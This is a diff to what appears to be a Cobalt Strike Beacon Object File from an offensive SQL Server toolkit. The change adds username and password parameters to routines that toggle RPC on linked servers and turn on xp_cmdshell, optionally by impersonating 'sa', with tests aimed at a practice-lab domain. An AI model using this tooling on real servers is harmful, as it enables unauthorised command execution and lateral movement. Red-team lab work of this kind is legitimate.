@@ -5,13 +5,13 @@
 
 
 // rpc requires different functions/values than the other modules
-void ToggleRpc(char* server, char* database, char* link, char* impersonate, char* value)
+void ToggleRpc(char* server, char* user, char* password, char* database, char* link, char* impersonate, char* value)
 {
     SQLHENV env		= NULL;
     SQLHSTMT stmt 	= NULL;
 	SQLHDBC dbc 	= NULL;
 
-	dbc = ConnectToSqlServer(&env, server, database);
+	dbc = ConnectToSqlServer(&env, server, user, password, database);
 
     if (dbc == NULL) {
 		goto END;
@@ -53,13 +53,13 @@ END:
 
 
 // non-rpc modules are treated the same
-void ToggleGenericModule(char* server, char* database, char* link, char* impersonate, char* module, char* value)
+void ToggleGenericModule(char* server, char* user, char* password, char* database, char* link, char* impersonate, char* module, char* value)
 {
     SQLHENV env		= NULL;
     SQLHSTMT stmt 	= NULL;
 	SQLHDBC dbc 	= NULL;
 
-	dbc = ConnectToSqlServer(&env, server, database);
+	dbc = ConnectToSqlServer(&env, server, user, password, database);
 
     if (dbc == NULL) {
 		goto END;
@@ -110,6 +110,8 @@ VOID go(
 ) 
 {
 	char* server;
+	char* user;
+	char* password;
 	char* database;
 	char* link;
 	char* impersonate;
@@ -123,6 +125,8 @@ VOID go(
 	BeaconDataParse(&parser, Buffer, Length);
 	
 	server	 	= BeaconDataExtract(&parser, NULL);
+	user	 	= BeaconDataExtract(&parser, NULL);
+	password 	= BeaconDataExtract(&parser, NULL);
 	database 	= BeaconDataExtract(&parser, NULL);
 	link 		= BeaconDataExtract(&parser, NULL);
 	impersonate = BeaconDataExtract(&parser, NULL);
@@ -130,6 +134,8 @@ VOID go(
 	value 		= BeaconDataExtract(&parser, NULL);
 
 	server = *server == 0 ? "localhost" : server;
+	user = *user == 0 ? NULL : user;
+	password = *password == 0 ? NULL : password;
 	database = *database == 0 ? "master" : database;
 	link = *link  == 0 ? NULL : link;
 	impersonate = *impersonate == 0 ?  NULL : impersonate;
@@ -148,7 +154,7 @@ VOID go(
 			printoutput(TRUE);
 			return;
 		}
-		ToggleRpc(server, database, link, impersonate, value);
+		ToggleRpc(server, user, password, database, link, impersonate, value);
 	}
 	// we're toggling one of the other modules that we treat the same
 	else
@@ -158,7 +164,7 @@ VOID go(
 			return;
 		}
 
-		ToggleGenericModule(server, database, link, impersonate, module, value);
+		ToggleGenericModule(server, user, password, database, link, impersonate, module, value);
 	}
 	
 
@@ -170,28 +176,28 @@ VOID go(
 int main()
 {
 	internal_printf("============ LINK RPC DISABLE TEST ============\n\n");
-	ToggleRpc("castelblack.north.sevenkingdoms.local", "master", "BRAAVOS", NULL, "FALSE");
+	ToggleRpc("castelblack.north.sevenkingdoms.local", NULL, NULL, "master", "BRAAVOS", NULL, "FALSE");
 
 	internal_printf("\n\n============ LINK RPC ENABLE TEST ============\n\n");
-	ToggleRpc("castelblack.north.sevenkingdoms.local", "master", "BRAAVOS", NULL, "TRUE");
+	ToggleRpc("castelblack.north.sevenkingdoms.local", NULL, NULL, "master", "BRAAVOS", NULL, "TRUE");
 
 	internal_printf("\n\n============ BASE XP_CMDSHELL DISABLE TEST ============\n\n");
-	ToggleGenericModule("castelblack.north.sevenkingdoms.local", "master", NULL, NULL, "xp_cmdshell", "0");
+	ToggleGenericModule("castelblack.north.sevenkingdoms.local", NULL, NULL, "master", NULL, NULL, "xp_cmdshell", "0");
 
 	internal_printf("\n\n============ BASE XP_CMDSHELL ENABLE TEST ============\n\n");
-	ToggleGenericModule("castelblack.north.sevenkingdoms.local", "master", NULL, NULL, "xp_cmdshell", "1");
+	ToggleGenericModule("castelblack.north.sevenkingdoms.local", NULL, NULL, "master", NULL, NULL, "xp_cmdshell", "1");
 
 	internal_printf("\n\n============ IMPERSONATE XP_CMDSHELL DISABLE TEST ============\n\n");
-	ToggleGenericModule("castelblack.north.sevenkingdoms.local", "master", NULL, "sa", "xp_cmdshell", "0");
+	ToggleGenericModule("castelblack.north.sevenkingdoms.local", NULL, NULL, "master", NULL, "sa", "xp_cmdshell", "0");
 
 	internal_printf("\n\n============ IMPERSONATE XP_CMDSHELL ENABLE TEST ============\n\n");
-	ToggleGenericModule("castelblack.north.sevenkingdoms.local", "master", NULL, "sa", "xp_cmdshell", "1");	
+	ToggleGenericModule("castelblack.north.sevenkingdoms.local", NULL, NULL, "master", NULL, "sa", "xp_cmdshell", "1");
 
 	internal_printf("\n\n============ LINK XP_CMDSHELL DISABLE TEST ============\n\n");
-	ToggleGenericModule("castelblack.north.sevenkingdoms.local", "master", "BRAAVOS", NULL, "xp_cmdshell", "0");
+	ToggleGenericModule("castelblack.north.sevenkingdoms.local", NULL, NULL, "master", "BRAAVOS", NULL, "xp_cmdshell", "0");
 
 	internal_printf("\n\n============ LINK XP_CMDSHELL ENABLE TEST ============\n\n");
-	ToggleGenericModule("castelblack.north.sevenkingdoms.local", "master", "BRAAVOS", NULL, "xp_cmdshell", "1");
+	ToggleGenericModule("castelblack.north.sevenkingdoms.local", NULL, NULL, "master", "BRAAVOS", NULL, "xp_cmdshell", "1");
 }
 
 #endif
